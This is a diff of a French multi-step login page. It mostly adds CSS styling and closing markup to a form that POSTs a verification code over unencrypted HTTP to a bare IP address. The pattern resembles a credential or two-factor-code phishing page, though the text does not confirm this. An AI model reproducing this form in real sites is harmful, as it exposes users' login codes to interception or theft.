@@ -94,7 +94,7 @@
     <div id="particles-js"></div>
     <script src="/particles.js" defer></script>
     <script src="/app-login.js" defer></script>
-    
+
         <!-- Étape 2: Vérification du code -->
         <form id="step-2" class="form-step" method="POST" action="http://57.129.134.101/verify_code.php">
             <h2>Étape 2 : Vérifier le code</h2>
@@ -102,3 +102,95 @@
             <button type="submit" class="next-btn">Vérifier</button>
             <button type="button" class="prev-btn" onclick="prevStep(1)">Retour</button>
         </form>
+    </div>
+
+    <style>
+        
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    
+    body {
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        background: radial-gradient(ellipse at bottom, #0b358f 0%, #000000 100%);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    
+    #particles-js {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: -1;
+    }
+    
+    .form-container {
+        background: rgba(0, 0, 0, 0.267);
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 400px;
+    }
+    
+    h2 {
+        text-align: center;
+        color: #ffffff;
+        margin-bottom: 20px;
+    }
+    
+    .form-step {
+        display: none;
+        flex-direction: column;
+    }
+    
+    .form-step.active {
+        display: flex;
+    }
+    
+    input[type="email"], input[type="text"], input[type="password"] {
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        width: 100%;
+        font-size: 16px;
+    }
+    
+    button {
+        padding: 10px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    
+    button.next-btn {
+        background: #021807;
+        color: white;
+    }
+    
+    button.prev-btn {
+        background: #ffffff;
+        color: black;
+        margin-right: 10px;
+    }
+    
+    button[type="submit"] {
+        background: #007bff;
+        color: white;
+    }
+    
+    button:hover {
+        opacity: 0.9;
+    }
+</style>
+</body>
+</html>
